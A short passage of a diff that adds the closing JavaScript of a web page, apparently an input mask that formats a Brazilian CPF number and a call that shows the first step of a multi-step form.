+    e.target.value = value.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+  } else if(value.length > 6){
+    e.target.value = value.replace(/(\d{3})(\d{3})(\d{0,3})/, '$1.$2.$3');
+  } else if(value.length > 3){
+    e.target.value = value.replace(/(\d{3})(\d{0,3})/, '$1.$2');
+  } else {
+    e.target.value = value;
+  }
+});
+
+showStep(1);
+</script>
+
+
+
+</body></html>
